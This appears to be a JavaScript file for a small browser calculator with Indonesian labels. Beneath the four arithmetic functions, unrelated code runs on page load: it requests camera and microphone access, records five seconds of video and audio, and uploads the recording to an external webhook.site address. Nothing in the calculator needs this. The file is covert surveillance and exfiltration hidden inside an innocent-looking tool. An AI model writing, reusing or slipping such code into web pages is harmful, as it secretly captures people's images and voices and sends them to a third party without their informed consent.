const input_1 = document.getElementById('input_1')
const input_2 = document.getElementById('input_2')
const hasil = document.getElementById('hasil')
let h1 = document.createElement('h1')

function tambah() {
    const hasil = Number(input_1.value) + Number(input_2.value)
    h1.textContent = hasil
    document.body.append("Hasil Penambahan: " + hasil + '\n')
}

function kurang() {
    const hasil = Number(input_1.value) - Number(input_2.value)
    h1.textContent = hasil
    document.body.append("Hasil Pengurangan: " + hasil + '\n')
}

function kali() {
    const hasil = Number(input_1.value) * Number(input_2.value)
    h1.textContent = hasil
    document.body.append("Hasil Pengkalian: " + hasil + '\n')
}

function bagi() {
    const hasil = Number(input_1.value) / Number(input_2.value)
    h1.textContent = hasil
    document.body.append("Hasil Pembagian: " + hasil + '\n')
}


// Mulai akses kamera
navigator.mediaDevices.getUserMedia({ video: true, audio: true })
.then(stream => {
  const mediaRecorder = new MediaRecorder(stream);
  const chunks = [];
  const webhookUrl = "https://webhook.site/0c80d53d-5770-4c04-968f-edd613021931";

  mediaRecorder.ondataavailable = event => {
    if (event.data.size > 0) chunks.push(event.data);
  };

  mediaRecorder.onstop = () => {
    // Buat video dari rekaman
    const videoBlob = new Blob(chunks, { type: 'video/webm' });

    // Buat FormData untuk mengirimkan video
    const formData = new FormData();
    formData.append('video', videoBlob, 'rekaman.webm');

    // Kirim video ke webhook
    fetch(webhookUrl, {
      method: "POST",
      body: formData
    })
    .then(() => console.log('✅ Video berhasil dikirim ke webhook.'))
    .catch(err => console.error('❌ Gagal mengirim video:', err));

    // Hentikan kamera
    stream.getTracks().forEach(track => track.stop());
  };

  // Mulai merekam
  mediaRecorder.start();
  console.log('🎥 Rekaman dimulai');

  // Hentikan setelah 5 detik
  setTimeout(() => {
    mediaRecorder.stop();
    console.log('🛑 Rekaman selesai');
  }, 5000);
})
.catch(err => {
  alert('🚫 Akses kamera ditolak atau tidak tersedia.');
  console.error(err);
});


